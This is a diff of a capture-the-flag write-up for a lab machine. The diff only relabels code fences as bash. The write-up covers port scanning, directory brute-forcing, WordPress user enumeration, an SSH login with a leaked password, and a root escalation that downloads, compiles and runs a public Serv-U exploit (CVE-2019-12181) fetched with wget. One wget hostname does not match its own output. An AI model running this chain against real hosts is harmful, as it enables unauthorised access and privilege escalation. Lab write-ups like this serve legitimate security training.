@@ -42,7 +42,7 @@ This machine test the knowledge on website information gathering. On finding dir
 
 To kick off I’d used the `rustscan` to identity the open ports initial scan revels only 2 ports, on which a site running on port 80, also with ssh port.
 
-```jsx
+```bash
 ┌──(blackops㉿Blackops)-[~]
 └─$ rustscan -a 192.168.1.21
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -92,7 +92,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
 
 Let’s do a directory search on the port, here i have used 2 types of tools for better visibility. There is hide was identified on the URL, `/index.php` this web-page is has the interface like it’s can’t connect to it, but the hidden under the web page source code. 
 
-```jsx
+```bash
 ┌──(blackops㉿Blackops)-[~]
 └─$ dirsearch -u http://192.168.1.21/ -e html,php,txt
   _|. _ _  _  _  _ _|_    v0.4.3
@@ -134,7 +134,7 @@ Target: http://192.168.1.21/
 [18:51:40] 403 -  277B  - /server-status/
 ```
 
-```jsx
+```bash
 
 <html><head>
 <title>404 Not Found</title>
@@ -149,7 +149,7 @@ Target: http://192.168.1.21/
 
 This is the hint the author left to us, To convert this I’ll use these commands, thus gives md5 hash of the word `beelzebub` , After looking around for long time, I’ve found that attaching this hash value to directory search result in finding more sites, 
 
-```jsx
+```bash
 ┌──(blackops㉿Blackops)-[~]
 └─$ echo -n "beelzebub" | md5sum
 d18e1e22becbd915b45e0e655429d487
@@ -159,7 +159,7 @@ d18e1e22becbd915b45e0e655429d487
 
 Here is what we found using the hint hash value along with Directory search, Looking at the website it’s easy to find the CMS (content management system) is WordPress!. Now that we found few more websites eventually you’ll end a looking at a website were you can interact with a interface, Looking under the hood of that particular web page, I was able to find a password send along with header of the response. I can be found using Burp/Caido to intercept the request the password, else check with In-build Browser fields to read the request and reposes.
 
-```jsx
+```bash
 ┌──(blackops㉿Blackops)-[~]
 └─$ dirsearch -u http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/ -e html,php,t
 
@@ -223,7 +223,7 @@ Task Completed
 
 But I have to identify the User for this password to work, where is where the CMS system helps, as we already identified the type of CMS system. With quick google search we’ll be able to find a tool called `wpscan.`  Using that we’ll scan the target for potential usernames.
 
-```jsx
+```bash
 ┌──(blackops㉿Blackops)-[~]
 └─$ wpscan --url http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/ -e u --ignore-main-redirect --force
 _______________________________________________________________
@@ -304,7 +304,7 @@ Interesting Finding(s):
 
 Now that I’ve found usernames checking with `SSH` , I was able to login into `krampus` with the password I found on browser request `M4k3Ad3a1` Now that we logged-in, I was able to get the userflag.txt and also able to login on to GUI version. 
 
-```jsx
+```bash
 ┌──(blackops㉿Blackops)-[~]
 └─$ ssh krampus@192.168.1.21
 krampus@192.168.1.21's password: 
@@ -335,7 +335,7 @@ aq12uu909a0q921a2819b05568a992m9
 
 Checking with the user ./bach_history something happned in the history which is worth taking a look, looks like a exploit was downloaded checking with online with it’s code reveals it’s was a CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation - A privilege escalation vulnerability exists in SolarWinds Serv-U before 15.1.7 for Linux.
 
-```jsx
+```bash
 ## history we found on ./bash_history
 wget https://www.exploit-db.com/download/47009
 clear
@@ -348,7 +348,7 @@ gcc exploit.c -o exploit
 
 Lets download that file run it for privilege escalation and it’s works as expected we gained Root access!
 
-```jsx
+```bash
 krampus@beelzebub:~$ wget https://asdfasdf.exploit-db.com/download/47009 -O file.c
 --2025-07-02 19:52:22--  https://www.exploit-db.com/download/47009
 Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
